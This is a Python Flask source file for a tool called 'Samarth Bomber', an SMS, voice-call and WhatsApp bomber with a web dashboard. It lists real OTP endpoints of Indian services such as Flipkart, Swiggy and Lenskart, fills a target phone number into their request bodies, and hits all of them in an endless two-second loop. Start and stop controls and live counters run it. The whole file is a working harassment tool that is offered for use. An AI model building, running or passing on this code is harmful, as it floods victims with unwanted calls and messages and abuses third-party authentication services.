from flask import Flask, request, jsonify
import asyncio
import aiohttp
import threading
from datetime import datetime

app = Flask(__name__)

# === FULL API LIST (add any missing ones from your original bot) ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    # Paste the remaining 20+ APIs from your original code here
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25: attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api.get("data")(phone) if callable(api.get("data")) else None
        async with session.request(
            method=api["method"], url=api["url"], headers=api["headers"],
            data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False
        ) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except:
        pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🔥 Attack started on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"Cycle {attack_status['cycles']} fired")
            await asyncio.sleep(2)
    
    add_log("🛑 Attack stopped")
    attack_status["running"] = False

@app.route('/')
def index():
    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Samarth Sms+Call Bomber</title><script src="https://cdn.tailwindcss.com"></script><style>body{background:linear-gradient(135deg,#0f172a,#1e2937)} .glass{background:rgba(15,23,42,0.9);backdrop-filter:blur(12px)}</style></head><body class="text-white min-h-screen"><div class="max-w-6xl mx-auto p-8"><div class="flex justify-between mb-12"><div class="flex items-center gap-4"><div class="w-14 h-14 bg-red-600 rounded-2xl flex items-center justify-center text-4xl">💥</div><div><h1 class="text-5xl font-bold">Samarth Bomber</h1><p class="text-emerald-400">SMS + CALL + WHATSAPP</p></div></div><div id="status" class="text-emerald-400 font-mono">READY</div></div><div class="grid grid-cols-12 gap-6"><div class="col-span-12 lg:col-span-5 glass rounded-3xl p-10"><h2 class="text-3xl mb-8">Target</h2><input id="phone" maxlength="10" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl px-6 py-5 text-3xl font-mono" placeholder="9876543210"><div class="flex gap-4 mt-8"><button onclick="startAttack()" id="startBtn" class="flex-1 bg-red-600 py-6 rounded-2xl text-xl font-bold">🚀 START INFINITE BOOM</button><button onclick="stopAttack()" id="stopBtn" class="hidden flex-1 bg-slate-700 py-6 rounded-2xl text-xl font-bold">🛑 STOP</button></div></div><div class="col-span-12 lg:col-span-7 glass rounded-3xl p-8"><h3 class="text-xl mb-6">LIVE STATS</h3><div class="grid grid-cols-3 gap-6"><div class="text-center"><div id="calls" class="text-5xl font-bold text-orange-400">0</div><div class="text-slate-400">CALLS</div></div><div class="text-center"><div id="sms" class="text-5xl font-bold text-blue-400">0</div><div class="text-slate-400">SMS</div></div><div class="text-center"><div id="wa" class="text-5xl font-bold text-green-400">0</div><div class="text-slate-400">WHATSAPP</div></div></div><div class="mt-8"><div class="flex justify-between text-sm mb-2"><span>CYCLES</span><span id="cycles">0</span></div><div class="h-2 bg-zinc-800 rounded"><div id="progress" class="h-2 bg-red-500 w-0 transition-all duration-300"></div></div></div></div><div class="col-span-12 glass rounded-3xl p-8"><h3 class="mb-4">LOGS</h3><div id="logs" class="font-mono text-sm h-80 overflow-auto bg-black/40 p-4 rounded-2xl"></div></div></div></div><script>let isRunning=false;async function startAttack(){const phone=document.getElementById("phone").value.trim();if(phone.length!==10)return alert("Invalid number");const res=await fetch("/start",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})});const data=await res.json();if(data.status==="success"){isRunning=true;document.getElementById("startBtn").classList.add("hidden");document.getElementById("stopBtn").classList.remove("hidden");document.getElementById("status").textContent="ATTACKING";poll();}}async function stopAttack(){await fetch("/stop",{method:"POST"});isRunning=false;document.getElementById("startBtn").classList.remove("hidden");document.getElementById("stopBtn").classList.add("hidden");document.getElementById("status").textContent="STOPPED";}function poll(){if(!isRunning)return;fetch("/status").then(r=>r.json()).then(d=>{document.getElementById("calls").textContent=d.stats.Call||0;document.getElementById("sms").textContent=d.stats.SMS||0;document.getElementById("wa").textContent=d.stats.WhatsApp||0;document.getElementById("cycles").textContent=d.cycles;document.getElementById("progress").style.width=Math.min(d.cycles*8%100+30,100)+"%";document.getElementById("logs").innerHTML=d.logs.map(l=>`<div>${l}</div>`).join("");setTimeout(poll,1200);});}</script></body></html>'''
    return html

@app.route('/start', methods=['POST'])
def start_attack():
    phone = request.json.get('phone')
    if not phone or len(phone) != 10: return jsonify({"status": "error"})
    if attack_status["running"]: return jsonify({"status": "error"})
    thread = threading.Thread(target=lambda: asyncio.run(run_attack(phone)))
    thread.daemon = True
    thread.start()
    return jsonify({"status": "success"})

@app.route('/stop', methods=['POST'])
def stop_attack():
    attack_status["running"] = False
    return jsonify({"status": "success"})

@app.route('/status')
def status():
    return jsonify({
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    })

if __name__ == '__main__':
    print("🚀 Samarth Bomber Dashboard running → http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
